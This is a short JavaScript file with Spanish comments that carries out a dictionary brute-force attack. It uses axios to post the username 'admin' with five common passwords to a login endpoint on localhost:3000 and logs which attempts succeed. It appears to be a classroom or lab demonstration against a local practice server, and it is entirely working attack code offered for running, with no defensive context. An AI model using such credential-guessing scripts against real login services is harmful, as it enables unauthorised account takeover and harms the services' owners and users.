// Importa el módulo 'axios' para hacer solicitudes HTTP
const axios = require("axios");

// Función asíncrona para realizar un ataque de fuerza bruta
async function ataqueFuerzaBruta() {
    // Lista de contraseñas comunes que se probarán
    const contraseñas = ["1234", "admin", "password", "qwerty", "abcd"];

    // Itera sobre cada contraseña en la lista
    for (const pass of contraseñas) {
        try {
            // Envía una solicitud POST al servidor de login con el usuario "admin" y la contraseña actual
            const respuesta = await axios.post("http://localhost:3000/login", {
                usuario: "admin",
                password: pass,
            });

            // Si la solicitud es exitosa, muestra la respuesta del servidor
            console.log(`Intento con ${pass}:`, respuesta.data);
        } catch (err) {
            // Si la solicitud falla (por ejemplo, contraseña incorrecta), muestra un mensaje de acceso denegado
            console.log(`Intento con ${pass}: Acceso denegado`);
        }
    }
}

// Ejecuta la función de ataque de fuerza bruta
ataqueFuerzaBruta();
